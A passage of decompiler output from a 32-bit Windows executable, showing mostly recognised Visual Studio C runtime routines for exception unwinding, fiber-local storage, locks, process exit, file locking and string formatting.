    _Dst = (char *)FUN_00406f66((size_t)(pcVar3 + (1 - (int)pcVar1)));
    _Memory = _Dst;
    if (_Dst != (char *)0x0) {
      _strcpy_s(_Dst,(rsize_t)(pcVar3 + (1 - (int)pcVar1)),*param_1);
      _Memory = (char *)0x0;
      *param_2 = _Dst;
      *(undefined *)(param_2 + 1) = 1;
    }
    FID_conflict__free(_Memory);
  }
  return;
}



// Library Function - Single Match
//  ___std_exception_destroy
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

void __cdecl ___std_exception_destroy(void **param_1)

{
  if (*(char *)(param_1 + 1) != '\0') {
    FID_conflict__free(*param_1);
  }
  *param_1 = (void *)0x0;
  *(undefined *)(param_1 + 1) = 0;
  return;
}



// Library Function - Single Match
//  __CxxThrowException@8
// 
// Library: Visual Studio 2015 Release

void __CxxThrowException_8(int *param_1,byte *param_2)

{
  code *pcVar1;
  int iVar2;
  int *piVar3;
  DWORD *pDVar4;
  DWORD *pDVar5;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  int *local_c;
  byte *local_8;
  
  pDVar4 = &DAT_00414210;
  pDVar5 = local_24;
  for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {
    *pDVar5 = *pDVar4;
    pDVar4 = pDVar4 + 1;
    pDVar5 = pDVar5 + 1;
  }
  if ((param_2 != (byte *)0x0) && ((*param_2 & 0x10) != 0)) {
    piVar3 = (int *)(*param_1 + -4);
    pcVar1 = *(code **)(*piVar3 + 0x20);
    param_2 = *(byte **)(*piVar3 + 0x18);
    _guard_check_icall();
    (*pcVar1)(piVar3);
  }
  local_c = param_1;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  local_8 = param_2;
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



// Library Function - Single Match
//  __local_unwind4
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __cdecl __local_unwind4(uint *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack40;
  undefined *puStack36;
  uint local_20;
  uint uStack28;
  int iStack24;
  uint *puStack20;
  
  puStack20 = param_1;
  iStack24 = param_2;
  uStack28 = param_3;
  puStack36 = &LAB_00403ab0;
  uStack40 = *in_FS_OFFSET;
  local_20 = DAT_0041b004 ^ (uint)&uStack40;
  *in_FS_OFFSET = &uStack40;
  while( true ) {
    uVar2 = *(uint *)(param_2 + 0xc);
    if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;
    puVar1 = (undefined4 *)((*(uint *)(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc);
    *(undefined4 *)(param_2 + 0xc) = *puVar1;
    if (puVar1[1] == 0) {
      __NLG_Notify(0x101);
      FUN_00404054();
    }
  }
  *in_FS_OFFSET = uStack40;
  return;
}



// Library Function - Single Match
//  @_EH4_CallFilterFunc@8
// 
// Library: Visual Studio 2015 Release

void __fastcall __EH4_CallFilterFunc_8(undefined *param_1)

{
  (*(code *)param_1)();
  return;
}



// Library Function - Single Match
//  @_EH4_TransferToHandler@8
// 
// Library: Visual Studio 2015 Release

void __fastcall __EH4_TransferToHandler_8(undefined *UNRECOVERED_JUMPTABLE)

{
  __NLG_Notify(1);
                    // WARNING: Could not recover jumptable at 0x00403b4c. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  @_EH4_GlobalUnwind2@8
// 
// Library: Visual Studio 2015 Release

void __fastcall __EH4_GlobalUnwind2_8(PVOID param_1,PEXCEPTION_RECORD param_2)

{
  RtlUnwind(param_1,(PVOID)0x403b62,param_2,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  @_EH4_LocalUnwind@16
// 
// Library: Visual Studio 2015 Release

void __fastcall __EH4_LocalUnwind_16(int param_1,uint param_2,undefined4 param_3,uint *param_4)

{
  __local_unwind4(param_4,param_1,param_2);
  return;
}



void FUN_00403b7e(undefined *param_1)

{
  if ((param_1 != (undefined *)0x0) && (param_1 != &DAT_0041bb8c)) {
    FID_conflict__free(param_1);
  }
  return;
}



// Library Function - Single Match
//  ___vcrt_initialize_ptd
// 
// Library: Visual Studio 2015 Release

uint ___vcrt_initialize_ptd(void)

{
  uint uVar1;
  int iVar2;
  
  uVar1 = ___vcrt_FlsAlloc(FUN_00403b7e);
  DAT_0041b020 = uVar1;
  if (uVar1 != 0xffffffff) {
    iVar2 = ___vcrt_FlsSetValue(uVar1,&DAT_0041bb8c);
    if (iVar2 != 0) {
      return CONCAT31((int3)((uint)iVar2 >> 8),1);
    }
    uVar1 = ___vcrt_uninitialize_ptd();
  }
  return uVar1 & 0xffffff00;
}



// Library Function - Single Match
//  ___vcrt_uninitialize_ptd
// 
// Library: Visual Studio 2015 Release

undefined4 ___vcrt_uninitialize_ptd(void)

{
  DWORD DVar1;
  
  DVar1 = DAT_0041b020;
  if (DAT_0041b020 != 0xffffffff) {
    DVar1 = ___vcrt_FlsFree(DAT_0041b020);
    DAT_0041b020 = 0xffffffff;
  }
  return CONCAT31((int3)(DVar1 >> 8),1);
}



// Library Function - Single Match
//  ___vcrt_initialize_locks
// 
// Library: Visual Studio 2015 Release

undefined4 ___vcrt_initialize_locks(void)

{
  int iVar1;
  uint uVar2;
  LPCRITICAL_SECTION p_Var3;
  
  p_Var3 = (LPCRITICAL_SECTION)&DAT_0041bbb4;
  uVar2 = 0;
  do {
    iVar1 = ___vcrt_InitializeCriticalSectionEx(p_Var3,4000,0);
    if (iVar1 == 0) {
      uVar2 = ___vcrt_uninitialize_locks();
      return uVar2 & 0xffffff00;
    }
    DAT_0041bbcc = DAT_0041bbcc + 1;
    uVar2 = uVar2 + 0x18;
    p_Var3 = p_Var3 + 1;
  } while (uVar2 < 0x18);
  return CONCAT31((int3)((uint)iVar1 >> 8),1);
}



// Library Function - Single Match
//  ___vcrt_uninitialize_locks
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

undefined4 ___vcrt_uninitialize_locks(void)

{
  undefined4 in_EAX;
  undefined4 extraout_EAX;
  int iVar1;
  LPCRITICAL_SECTION lpCriticalSection;
  
  if (DAT_0041bbcc != 0) {
    lpCriticalSection = (LPCRITICAL_SECTION)(&DAT_0041bb9c + DAT_0041bbcc * 0x18);
    iVar1 = DAT_0041bbcc;
    do {
      DeleteCriticalSection(lpCriticalSection);
      DAT_0041bbcc = DAT_0041bbcc + -1;
      lpCriticalSection = lpCriticalSection + -1;
      iVar1 = iVar1 + -1;
      in_EAX = extraout_EAX;
    } while (iVar1 != 0);
  }
  return CONCAT31((int3)((uint)in_EAX >> 8),1);
}



// Library Function - Single Match
//  void * __cdecl __crt_fast_encode_pointer<void *>(void * const)
// 
// Library: Visual Studio 2015 Release

void * __cdecl __crt_fast_encode_pointer_void__(void *param_1)

{
  byte bVar1;
  
  bVar1 = 0x20 - ((byte)DAT_0041b004 & 0x1f) & 0x1f;
  return (void *)(((uint)param_1 >> bVar1 | (int)param_1 << 0x20 - bVar1) ^ DAT_0041b004);
}



// Library Function - Single Match
//  void * __cdecl try_get_function(enum `anonymous namespace'::function_id,char const * const,enum
// A0x89697e75::module_id const * const,enum A0x89697e75::module_id const * const)
// 
// Library: Visual Studio 2015 Release

void * __cdecl
try_get_function(function_id param_1,char *param_2,module_id *param_3,module_id *param_4)

{
  void **ppvVar1;
  void *pvVar2;
  HMODULE hModule;
  FARPROC pFVar3;
  byte bVar4;
  
  ppvVar1 = (void **)(&DAT_0041bbe0 + param_1);
  pvVar2 = (void *)0x0;
  LOCK();
  if (*ppvVar1 == (void *)0x0) {
    *ppvVar1 = (void *)0x0;
  }
  else {
    pvVar2 = *ppvVar1;
  }
  bVar4 = (byte)DAT_0041b004 & 0x1f;
  pvVar2 = (void *)((DAT_0041b004 ^ (uint)pvVar2) >> bVar4 |
                   (DAT_0041b004 ^ (uint)pvVar2) << 0x20 - bVar4);
  if (pvVar2 != (void *)0xffffffff) {
    if (pvVar2 != (void *)0x0) {
      return pvVar2;
    }
    if (param_3 != param_4) {
      do {
        hModule = try_get_module(*param_3);
        if (hModule != (HINSTANCE__ *)0x0) goto LAB_00403ccc;
        param_3 = param_3 + 1;
      } while (param_3 != param_4);
    }
    hModule = (HMODULE)0x0;
LAB_00403ccc:
    if ((hModule != (HMODULE)0x0) &&
       (pFVar3 = GetProcAddress(hModule,param_2), pFVar3 != (FARPROC)0x0)) {
      pvVar2 = __crt_fast_encode_pointer_void__(pFVar3);
      *ppvVar1 = pvVar2;
      return pFVar3;
    }
    bVar4 = 0x20 - ((byte)DAT_0041b004 & 0x1f) & 0x1f;
    *ppvVar1 = (void *)((0xffffffffU >> bVar4 | -1 << 0x20 - bVar4) ^ DAT_0041b004);
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  struct HINSTANCE__ * __cdecl try_get_module(enum `anonymous namespace'::module_id)
// 
// Library: Visual Studio 2015 Release

HINSTANCE__ * __cdecl try_get_module(module_id param_1)

{
  HMODULE *ppHVar1;
  LPCWSTR lpLibFileName;
  HMODULE pHVar2;
  HINSTANCE__ *hLibModule;
  DWORD DVar3;
  
  pHVar2 = (HMODULE)0x0;
  ppHVar1 = (HMODULE *)(&DAT_0041bbd0 + param_1);
  LOCK();
  if (*ppHVar1 == (HMODULE)0x0) {
    *ppHVar1 = (HMODULE)0x0;
  }
  else {
    pHVar2 = *ppHVar1;
  }
  if (pHVar2 == (HMODULE)0x0) {
    lpLibFileName = (LPCWSTR)(&PTR_u_advapi32_00414230)[param_1];
    hLibModule = LoadLibraryExW(lpLibFileName,(HANDLE)0x0,0x800);
    if (hLibModule == (HMODULE)0x0) {
      DVar3 = GetLastError();
      if (DVar3 == 0x57) {
        hLibModule = LoadLibraryExW(lpLibFileName,(HANDLE)0x0,0);
      }
      else {
        hLibModule = (HMODULE)0x0;
      }
      if (hLibModule == (HMODULE)0x0) {
        *ppHVar1 = (HMODULE)0xffffffff;
        return (HINSTANCE__ *)0x0;
      }
    }
    pHVar2 = *ppHVar1;
    *ppHVar1 = hLibModule;
    if (pHVar2 != (HMODULE)0x0) {
      FreeLibrary(hLibModule);
    }
  }
  else {
    hLibModule = (HINSTANCE__ *)(-(uint)(pHVar2 != (HMODULE)0xffffffff) & (uint)pHVar2);
  }
  return hLibModule;
}



// Library Function - Single Match
//  ___vcrt_FlsAlloc
// 
// Library: Visual Studio 2015 Release

void __cdecl ___vcrt_FlsAlloc(undefined4 param_1)

{
  code *pcVar1;
  
  pcVar1 = (code *)try_get_function(4,"FlsAlloc",(module_id *)&DAT_004142e0,(module_id *)"FlsAlloc")
  ;
  if (pcVar1 != (code *)0x0) {
    _guard_check_icall();
    (*pcVar1)(param_1);
    return;
  }
                    // WARNING: Could not recover jumptable at 0x00403dc5. Too many branches
                    // WARNING: Treating indirect jump as call
  TlsAlloc();
  return;
}



// Library Function - Single Match
//  ___vcrt_FlsFree
// 
// Library: Visual Studio 2015 Release

void __cdecl ___vcrt_FlsFree(DWORD param_1)

{
  code *pcVar1;
  
  pcVar1 = (code *)try_get_function(5,"FlsFree",(module_id *)&DAT_004142f4,(module_id *)"FlsFree");
  if (pcVar1 == (code *)0x0) {
    TlsFree(param_1);
  }
  else {
    _guard_check_icall();
    (*pcVar1)();
  }
  return;
}



// Library Function - Single Match
//  ___vcrt_FlsSetValue
// 
// Library: Visual Studio 2015 Release

void __cdecl ___vcrt_FlsSetValue(DWORD param_1,LPVOID param_2)

{
  code *pcVar1;
  
  pcVar1 = (code *)try_get_function(7,"FlsSetValue",(module_id *)&DAT_00414310,
                                    (module_id *)"FlsSetValue");
  if (pcVar1 == (code *)0x0) {
    TlsSetValue(param_1,param_2);
  }
  else {
    _guard_check_icall();
    (*pcVar1)();
  }
  return;
}



// Library Function - Single Match
//  ___vcrt_InitializeCriticalSectionEx
// 
// Library: Visual Studio 2015 Release

void __cdecl
___vcrt_InitializeCriticalSectionEx(LPCRITICAL_SECTION param_1,DWORD param_2,undefined4 param_3)

{
  code *pcVar1;
  
  pcVar1 = (code *)try_get_function(8,"InitializeCriticalSectionEx",(module_id *)&DAT_00414324,
                                    (module_id *)"InitializeCriticalSectionEx");
  if (pcVar1 == (code *)0x0) {
    InitializeCriticalSectionAndSpinCount(param_1,param_2);
  }
  else {
    _guard_check_icall();
    (*pcVar1)(param_1,param_2,param_3);
  }
  return;
}



// Library Function - Single Match
//  ___vcrt_initialize_winapi_thunks
// 
// Library: Visual Studio 2015 Release

void ___vcrt_initialize_winapi_thunks(void)

{
  byte bVar1;
  uint *puVar2;
  int iVar3;
  uint uVar4;
  
  puVar2 = &DAT_0041bbe0;
  bVar1 = 0x20 - ((byte)DAT_0041b004 & 0x1f) & 0x1f;
  iVar3 = 0;
  uVar4 = (0U >> bVar1 | 0 << 0x20 - bVar1) ^ DAT_0041b004;
  do {
    iVar3 = iVar3 + 1;
    *puVar2 = uVar4;
    puVar2 = puVar2 + 1;
  } while (iVar3 != 9);
  return;
}



// Library Function - Single Match
//  ___vcrt_uninitialize_winapi_thunks
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

void __cdecl ___vcrt_uninitialize_winapi_thunks(char param_1)

{
  HMODULE *ppHVar1;
  
  if (param_1 == '\0') {
    ppHVar1 = (HMODULE *)&DAT_0041bbd0;
    do {
      if (*ppHVar1 != (HMODULE)0x0) {
        if (*ppHVar1 != (HMODULE)0xffffffff) {
          FreeLibrary(*ppHVar1);
        }
        *ppHVar1 = (HMODULE)0x0;
      }
      ppHVar1 = ppHVar1 + 1;
    } while (ppHVar1 != (HMODULE *)&DAT_0041bbe0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___vcrt_initialize_pure_virtual_call_handler
// 
// Library: Visual Studio 2015 Release

void ___vcrt_initialize_pure_virtual_call_handler(void)

{
  byte bVar1;
  
  bVar1 = 0x20 - ((byte)DAT_0041b004 & 0x1f) & 0x1f;
  _DAT_0041bc04 = (0U >> bVar1 | 0 << 0x20 - bVar1) ^ DAT_0041b004;
  return;
}



// Library Function - Single Match
//  __global_unwind2
// 
// Library: Visual Studio

void __cdecl __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x403f38,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  __local_unwind2
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __cdecl __local_unwind2(int param_1,uint param_2)

{
  uint uVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 local_20;
  undefined *puStack28;
  undefined4 local_18;
  int iStack20;
  
  iStack20 = param_1;
  puStack28 = &LAB_00403f40;
  local_20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &local_20;
  while( true ) {
    uVar1 = *(uint *)(param_1 + 0xc);
    if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;
    local_18 = *(undefined4 *)(*(int *)(param_1 + 8) + uVar1 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_18;
    if (*(int *)(*(int *)(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {
      __NLG_Notify(0x101);
      FUN_00404054();
    }
  }
  *in_FS_OFFSET = local_20;
  return;
}



// Library Function - Single Match
//  __NLG_Notify
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __NLG_Notify(ulong param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_0041b034 = in_EAX;
  DAT_0041b038 = param_1;
  DAT_0041b03c = unaff_EBP;
  return;
}



void FUN_00404054(void)

{
  code *in_EAX;
  
  (*in_EAX)();
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  int (__cdecl*__cdecl __crt_fast_encode_pointer<int (__cdecl*)(void)>(int
// (__cdecl*const)(void)))(void)
//  void (__cdecl** __cdecl __crt_fast_encode_pointer<void (__cdecl**)(void)>(void (__cdecl**
// const)(void)))(void)
// 
// Library: Visual Studio 2015 Release

uint __cdecl __crt_fast_encode_pointer__(uint param_1)

{
  byte bVar1;
  
  bVar1 = 0x20 - ((byte)DAT_0041b004 & 0x1f) & 0x1f;
  return (param_1 >> bVar1 | param_1 << 0x20 - bVar1) ^ DAT_0041b004;
}



// Library Function - Single Match
//  int __cdecl atexit_exception_filter(unsigned long)
// 
// Library: Visual Studio 2015 Release

int __cdecl atexit_exception_filter(ulong param_1)

{
  return (uint)(param_1 == 0xe06d7363);
}



// WARNING: Function: __SEH_prolog4_GS replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl common_exit(int,enum _crt_exit_cleanup_mode,enum _crt_exit_return_mode)
// 
// Library: Visual Studio 2015 Release

void __cdecl common_exit(int param_1,_crt_exit_cleanup_mode param_2,_crt_exit_return_mode param_3)

{
  byte bVar1;
  byte bVar2;
  uint uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined uVar6;
  undefined4 uVar7;
  ulong **local_18;
  
  if (param_3 == 0) {
    uVar3 = ___scrt_is_managed_app();
    if ((char)uVar3 != '\0') {
      try_cor_exit_process(param_1);
    }
  }
  ___acrt_lock(2);
  if (DAT_0041bc4c != '\0') goto LAB_00404160;
  DAT_0041bc44 = 1;
  if (param_2 == 0) {
    bVar2 = (byte)DAT_0041b004 & 0x1f;
    bVar1 = 0x20 - bVar2 & 0x1f;
    if (DAT_0041bc48 != ((0U >> bVar1 | 0 << 0x20 - bVar1) ^ DAT_0041b004)) {
      uVar3 = DAT_0041b004 ^ DAT_0041bc48;
      uVar7 = 0;
      uVar5 = 0;
      uVar4 = 0;
      _guard_check_icall();
      (*(code *)(uVar3 >> bVar2 | uVar3 << 0x20 - bVar2))(uVar4,uVar5,uVar7);
    }
    uVar6 = 0x94;
LAB_00404125:
    __execute_onexit_table(uVar6);
  }
  else if (param_2 == 1) {
    uVar6 = 0xa0;
    goto LAB_00404125;
  }
  if (param_2 == 0) {
    __initterm((undefined **)&DAT_00414184,(undefined **)&DAT_00414194);
  }
  __initterm((undefined **)&DAT_00414198,(undefined **)&DAT_0041419c);
  if (param_3 == 0) {
    DAT_0041bc4c = '\x01';
  }
LAB_00404160:
  FUN_00404193();
  if (param_3 == 0) {
    exit_or_terminate_process(param_1);
    atexit_exception_filter(**local_18);
    return;
  }
  FUN_004129b9();
  return;
}



void FUN_00404193(void)

{
  ___acrt_unlock(2);
  return;
}



// Library Function - Single Match
//  void __cdecl exit_or_terminate_process(unsigned int)
// 
// Library: Visual Studio 2015 Release

void __cdecl exit_or_terminate_process(uint param_1)

{
  char cVar1;
  HANDLE hProcess;
  undefined4 in_ECX;
  int in_FS_OFFSET;
  uint uExitCode;
  
  cVar1 = ___acrt_is_packaged_app(in_ECX);
  if ((cVar1 != '\0') && ((*(uint *)(*(int *)(in_FS_OFFSET + 0x30) + 0x68) >> 8 & 1) == 0)) {
    uExitCode = param_1;
    hProcess = GetCurrentProcess();
    TerminateProcess(hProcess,uExitCode);
  }
  try_cor_exit_process(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



// Library Function - Single Match
//  ___scrt_is_managed_app
// 
// Library: Visual Studio 2015 Release

uint ___scrt_is_managed_app(void)

{
  HMODULE pHVar1;
  HMODULE pHVar2;
  
  pHVar1 = GetModuleHandleW((LPCWSTR)0x0);
  pHVar2 = pHVar1;
  if ((((pHVar1 != (HMODULE)0x0) && (pHVar2 = (HMODULE)0x5a4d, *(short *)&pHVar1->unused == 0x5a4d))
      && (pHVar2 = (HMODULE)((int)&pHVar1->unused + pHVar1[0xf].unused), pHVar2->unused == 0x4550))
     && ((*(short *)&pHVar2[6].unused == 0x10b && (0xe < (uint)pHVar2[0x1d].unused)))) {
    return (uint)pHVar2 & 0xffffff00 | (uint)(pHVar2[0x3a].unused != 0);
  }
  return (uint)pHVar2 & 0xffffff00;
}



// Library Function - Single Match
//  void __cdecl try_cor_exit_process(unsigned int)
// 
// Library: Visual Studio 2015 Release

void __cdecl try_cor_exit_process(uint param_1)

{
  uint uVar1;
  BOOL BVar2;
  FARPROC pFVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined uVar4;
  HMODULE hModule;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  hModule = (HMODULE)0x0;
  BVar2 = GetModuleHandleExW(0,L"mscoree.dll",(HMODULE *)&stack0xfffffff4);
  uVar4 = extraout_DL;
  if ((BVar2 != 0) &&
     (pFVar3 = GetProcAddress(hModule,"CorExitProcess"), uVar4 = extraout_DL_00,
     pFVar3 != (FARPROC)0x0)) {
    _guard_check_icall();
    (*pFVar3)(param_1);
    uVar4 = extraout_DL_01;
  }
  if (hModule != (HMODULE)0x0) {
    FreeLibrary(hModule);
    uVar4 = extraout_DL_02;
  }
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,uVar4,(char)hModule);
  return;
}



void __cdecl FUN_00404291(undefined4 param_1)

{
  DAT_0041bc48 = param_1;
  return;
}



void FUN_004042a0(void)

{
  common_exit(0,2,1);
  return;
}



// Library Function - Single Match
//  __cexit
// 
// Library: Visual Studio 2015 Release

void __cdecl __cexit(void)

{
  common_exit(0,0,1);
  return;
}



// Library Function - Single Match
//  __exit
// 
// Library: Visual Studio 2015 Release

void __cdecl __exit(int param_1)

{
  common_exit(param_1,2,0);
  return;
}



// WARNING: Function: __SEH_prolog4_GS replaced with injection: SEH_prolog4
// Library Function - Single Match
//  __register_thread_local_exe_atexit_callback
// 
// Library: Visual Studio 2015 Release

void __cdecl __register_thread_local_exe_atexit_callback(uint param_1)

{
  code *pcVar1;
  byte bVar2;
  __acrt_ptd *p_Var3;
  
  bVar2 = 0x20 - ((byte)DAT_0041b004 & 0x1f) & 0x1f;
  if (DAT_0041bc48 == ((0U >> bVar2 | 0 << 0x20 - bVar2) ^ DAT_0041b004)) {
    DAT_0041bc48 = __crt_fast_encode_pointer__(param_1);
    return;
  }
  p_Var3 = ___acrt_getptd();
  pcVar1 = *(code **)(p_Var3 + 0xc);
  if (pcVar1 != (code *)0x0) {
    _guard_check_icall();
    (*pcVar1)();
  }
  _abort();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  _exit
// 
// Library: Visual Studio 2015 Release

void __cdecl _exit(int _Code)

{
  common_exit(_Code,0,0);
  return;
}



// Library Function - Single Match
//  ___acrt_iob_func
// 
// Library: Visual Studio 2015 Release

undefined * __cdecl ___acrt_iob_func(int param_1)

{
  return &DAT_0041b040 + param_1 * 0x38;
}



// Library Function - Single Match
//  __lock_file
// 
// Library: Visual Studio 2015 Release

void __cdecl __lock_file(FILE *_File)

{
  EnterCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



// Library Function - Single Match
//  __unlock_file
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

void __cdecl __unlock_file(FILE *_File)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



void FUN_0040446e(void *param_1,uint param_2)

{
  __realloc_base(param_1,param_2);
  return;
}



// Library Function - Single Match
//  _wcscat_s
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

errno_t __cdecl _wcscat_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  int iVar4;
  int iStack20;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        if (*pwVar3 == L'\0') break;
        pwVar3 = pwVar3 + 1;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        iVar4 = (int)_Src - (int)pwVar3;
        do {
          wVar1 = *(wchar_t *)(iVar4 + (int)pwVar3);
          *pwVar3 = wVar1;
          pwVar3 = pwVar3 + 1;
          if (wVar1 == L'\0') break;
          _SizeInWords = _SizeInWords - 1;
        } while (_SizeInWords != 0);
        if (_SizeInWords != 0) {
          return 0;
        }
        *_Dst = L'\0';
        piVar2 = __errno();
        iStack20 = 0x22;
        goto LAB_004044a2;
      }
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  iStack20 = 0x16;
LAB_004044a2:
  *piVar2 = iStack20;
  FUN_004091be();
  return iStack20;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Same Base Name
//  public: int __thiscall __crt_seh_guarded_call<int>::operator()<class
// <lambda_5be909dfbae0a631386585770cd7b676>,class <lambda_e516058a9c289d98c8ca9fea99247804>&,class
// <lambda_afe2e0cdc5e0ecf6f0d6f5e2f8985e38>>(class
// <lambda_5be909dfbae0a631386585770cd7b676>&&,class
// <lambda_e516058a9c289d98c8ca9fea99247804>&,class <lambda_afe2e0cdc5e0ecf6f0d6f5e2f8985e38>&&)
//  public: int __thiscall __crt_seh_guarded_call<int>::operator()<class
// <lambda_823d65812123d985753d53e2a8c25d20>,class <lambda_0a97c9e57da7be065955385c79108ff2>&,class
// <lambda_4d2973f3ad2d226f00468307185dca1b>>(class
// <lambda_823d65812123d985753d53e2a8c25d20>&&,class
// <lambda_0a97c9e57da7be065955385c79108ff2>&,class <lambda_4d2973f3ad2d226f00468307185dca1b>&&)
//  public: int __thiscall __crt_seh_guarded_call<int>::operator()<class
// <lambda_ab9923ffb5d694ec0d78876dd103e44f>,class <lambda_481dd5778c961fbcd3b60b650e9b9dc4>&,class
// <lambda_7923d86c9e3f319b415918ec4b39749c>>(class
// <lambda_ab9923ffb5d694ec0d78876dd103e44f>&&,class
// <lambda_481dd5778c961fbcd3b60b650e9b9dc4>&,class <lambda_7923d86c9e3f319b415918ec4b39749c>&&)
//  public: int __thiscall __crt_seh_guarded_call<int>::operator()<class
// <lambda_db08b09ef7aa9d4f8620ce68402612bc>,class <lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b>&,class
// <lambda_3ae262bc35d4ba6a3825c4f6bcaaf95c>>(class
// <lambda_db08b09ef7aa9d4f8620ce68402612bc>&&,class
// <lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b>&,class <lambda_3ae262bc35d4ba6a3825c4f6bcaaf95c>&&)
// 
// Library: Visual Studio 2015 Release

int operator____(FILE **param_1,_lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b_ *param_2)

{
  int iVar1;
  
  __lock_file(*param_1);
  iVar1 = <lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b>::operator__(param_2);
  FUN_00404533();
  return iVar1;
}



void FUN_00404533(void)

{
  int unaff_EBP;
  
  __unlock_file(**(FILE ***)(unaff_EBP + 0x10));
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  int __cdecl __acrt_lock_stream_and_call<class <lambda_0a97c9e57da7be065955385c79108ff2>>(struct
// _iobuf * const,class <lambda_0a97c9e57da7be065955385c79108ff2>&&)
//  int __cdecl __acrt_lock_stream_and_call<class <lambda_2565fc715a641e539f44ad02d6823606>>(struct
// _iobuf * const,class <lambda_2565fc715a641e539f44ad02d6823606>&&)
//  int __cdecl __acrt_lock_stream_and_call<class <lambda_481dd5778c961fbcd3b60b650e9b9dc4>>(struct
// _iobuf * const,class <lambda_481dd5778c961fbcd3b60b650e9b9dc4>&&)
//  int __cdecl __acrt_lock_stream_and_call<class <lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b>>(struct
// _iobuf * const,class <lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b>&&)
//   8 names - too many to list
// 
// Library: Visual Studio 2015 Release

void __cdecl
__acrt_lock_stream_and_call__(FILE *param_1,_lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b_ *param_2)

{
  FILE *local_10;
  FILE *local_c;
  
  local_c = param_1;
  local_10 = param_1;
  operator____(&local_10,param_2);
  return;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  int __cdecl common_vsprintf<class __crt_stdio_output::standard_base,char>(unsigned __int64,char
// * const,unsigned int,char const * const,struct __crt_locale_pointers * const,char * const)
// 
// Library: Visual Studio 2015 Release

int __cdecl
common_vsprintf_class___crt_stdio_output__standard_base_char_
          (__uint64 param_1,char *param_2,uint param_3,char *param_4,__crt_locale_pointers *param_5,
          char *param_6)

{
  undefined4 *******pppppppuVar1;
  int *piVar2;
  int iVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar4;
  int in_stack_fffffb78;
  undefined local_484 [8];
  char local_47c;
  uint local_478;
  undefined4 *******local_474;
  uint local_470;
  uint local_46c;
  undefined4 local_468;
  undefined4 *******local_464;
  output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
  local_460 [64];
  formatting_buffer local_420 [1048];
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  local_464 = (undefined4 *******)param_2;
  if ((param_4 == (char *)0x0) || ((param_3 != 0 && (param_2 == (char *)0x0)))) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_004091be();
    uVar4 = extraout_DL;
    goto LAB_004046b8;
  }
